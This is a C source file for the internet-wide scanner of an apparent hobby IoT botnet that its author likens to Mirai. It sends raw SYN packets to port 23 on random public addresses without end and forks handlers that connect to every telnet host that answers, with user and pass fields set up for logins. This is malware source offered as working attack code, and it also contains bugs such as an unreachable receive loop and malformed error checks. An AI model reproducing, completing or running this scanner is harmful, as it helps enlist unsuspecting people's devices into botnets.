#include "../include/main.h"

/*
	Okay so the original idea was to have a listening proc a sending proc and
	a recv proc. Then when it recv a client it would spawn a proc to deal with
	that client.

	Then I realized how weak the devices I'm aiming for are and just used a
	structure similar to mirai.

	Full disclosure: I'm not a coding and network god so mirais scanner is
	probably better (100% sure it is). I'm just doing this for fun :)
*/
port_t LOCAL_PORT; // Global source port
ipv4_t LOCAL_ADDR; // Global source port

uint8_t SCAN_CONS = 0;

bool scan_able = true;

void scan_init(void)
{
	int32_t ret;

	if ((ret = fork()) != 0)
		return; // We are parent or it failed, lets go home
	else // Child has spawned and we are the child
	{
		// if (proc_root()) // Make it check for root and shit later
		if (scan_scanner() == false)
			scan_able = false;
		_exit(0);
	}
	return;
}

// Checksum calculator
// Only for use in this file
// Not mine!
static unsigned short csum(unsigned short *ptr, int nbytes)
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while (nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1)
	{
		oddbyte = 0;
		*((u_char *)&oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short) ~sum;

	return (answer);
}

bool scan_scanner(void)
{
	if (scan_able == false)
		goto end;

	printd("Initializing Scanner")

	int32_t sock, i = 1;
	uint16_t fails = 0;
	char datagram[4096];
	zero(datagram, 4096);

	// IP and TCP  structures
	struct iphdr *iph = (struct iphdr *) datagram;
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));

	/* sockaddr struct and checksum struct */
	struct sockaddr_in addr;
	struct pseudo_header psh;

	if (ipv4_getinfo(&LOCAL_ADDR) == false)
		goto end;
	printd("Local info: %d %s", LOCAL_ADDR, ipv4_unpack(LOCAL_ADDR));

	// Set the random source port
	do
		LOCAL_PORT = rand();
	while (LOCAL_PORT < 1024); // make sure it isn't send below 1024 which is
	// reserved for root use only


	// Sockaddr header fillout
	addr.sin_family = AF_INET;

	// Pseudo header fillout
	psh.source_address = LOCAL_ADDR;
	psh.placeholder = 0;
	psh.protocol = 6; // TCP

	// IP header fillout
	iph->saddr = LOCAL_ADDR;
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0; // TOS = Type of service Can change QoS
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph->id = htons(54321); // Id of this packet
	iph->frag_off = htons(16384);
	/*
		  TTL = TTL goes down onces for ever re-router it hits
		  If it hits 0 its discarded and icmp error sent
  */
	iph->ttl = 64;
	iph->protocol = 6; // 6 = TCP

	// TCP header fillout
	tcph->source= htons(LOCAL_PORT);
	tcph->dest = htons(23); // Port 23 dest
	tcph->seq = htonl(1105024978);
	tcph->ack_seq = 0;
	tcph->doff = sizeof(struct tcphdr) / 4; // Size of tcp header
	tcph->fin = 0;
	tcph->syn = 1; // Syncronize packet to check if the port is open
	tcph->rst = 0; // No other should be checked
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->window = htons(14600); // Maximum allowed window size
	tcph->urg_ptr = 0;
	tcph->dest = htons(23); // Port 23

	// Create a raw socket
	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
	{
		printd("Failed to open raw socket")
		goto end;
	}

	if ((fcntl(sock, F_SETFL, O_NONBLOCK | fcntl(sock, F_GETFL, 0))) -1)
	{
		printd("Failed to open set nonblocking")
		goto end;
	}

	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) < 0)
	{
		printd("Failed to set IP_HDRINCL")
		goto end;
	}


	memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

	printd("Sending packets...")
	while (1)
	{
		for (i = 0; i < SCAN_SCANNER_BURST; i++)
		{
			addr.sin_addr.s_addr = ipv4_random_public(); // It should already be a 32 bit uint
			iph->daddr = addr.sin_addr.s_addr;
			// Reset the checksums
			iph->check = 0;
			tcph->check = 0;

			// Set up the checksums
			psh.dest_address = addr.sin_addr.s_addr;
			psh.tcp_length = htons(sizeof(struct tcphdr));

			// memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));

			// Make the checksums
			iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
			tcph->check = csum((unsigned short *)&psh, sizeof(struct pseudo_header));

			// Send the packet
			if (sendto(sock, datagram, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&addr, sizeof(addr)) < 0)
			{
				if (++fails >= SCAN_SCANNER_ERRMAX)
				{
					printd("Maximum fails reached: %d", SCAN_SCANNER_ERRMAX)
					goto end;
				}
			}
		}
	}
	while (1)
	{
		unsigned char buf[1024];

		errno = 0;
		i = recvfrom(sock, buf, 1024, 0, NULL, NULL);
		if (i <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
			goto end;

		struct iphdr *riph = (struct iphdr *)buf;
		unsigned short iphdrlen;

		if (riph->protocol == 6)
		{
			iphdrlen = riph->ihl * 4;
			struct tcphdr *rtcph = (struct tcphdr *)(buf + iphdrlen);

			// Check that it is a SYN ACK and if it matches our source port
			if (rtcph->syn == 1 && rtcph->ack == 1 && rtcph->dest == LOCAL_PORT && rtcph->source == 23/*&& ipv4_inrange(source.sin_addr.s_addr, start, end)*/)
			{
				pktd(riph, rtcph) // Only in debug releases
				scan_handler(riph->saddr);
			}
		}
	}
end:
	_exit(0);
}

bool scan_listen(void)
{
	int32_t sock, saddr_size, data_size;
	struct sockaddr saddr;
	unsigned char *buf = (unsigned char *)calloc(65536, sizeof(unsigned char *));

	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
		goto end;

	saddr_size = sizeof(saddr);

	while (1)
	{
		if ((data_size = recvfrom(sock, buf, 65535, 0, &saddr, (unsigned int *)&saddr_size)) < 0)
			goto end;

		struct iphdr *iph = (struct iphdr *)buf;
		unsigned short iphdrlen;

		if (iph->protocol == 6)
		{
			iphdrlen = iph->ihl * 4;
			struct tcphdr *tcph = (struct tcphdr *)(buf + iphdrlen);

			// Check that it is a SYN ACK and if it matches our source port
			if (tcph->syn == 1 && tcph->ack == 1 && tcph->dest == LOCAL_PORT && tcph->source == 23/*&& ipv4_inrange(source.sin_addr.s_addr, start, end)*/)
			{
				pktd(iph, tcph) // Only in debug releases
				scan_handler(iph->saddr);
			}
		}
	}

end:
	free(buf);
	close(sock);
	return false;
}

void scan_handler(ipv4_t ip)
{
	int32_t ret;

	if ((ret = fork()) != 0)
		return;

	while (SCAN_CONS >= SCAN_MAXCONNS)
		sleep(10); // Wait until we are free to process the client

	telnetinfo_t client;
	int sock;
	unsigned char *buf = calloc(1024, sizeof(unsigned char *));

	struct sockaddr_in addr;
	addr.sin_addr.s_addr = ip;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(23); // Set our port
	memset(addr.sin_zero, '\0', sizeof(addr.sin_zero));

	client.ip = ip;
	client.user = 0;
	client.pass = 0;
	strcpy(client.prompt, "\0");

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		goto end;

	if ((read(sock, buf, 1024)) < 0)
		goto end;

	if ((write(sock, buf, 1024)) < 0)
		goto end;
end:;
	free(buf);
	_exit(0);
}
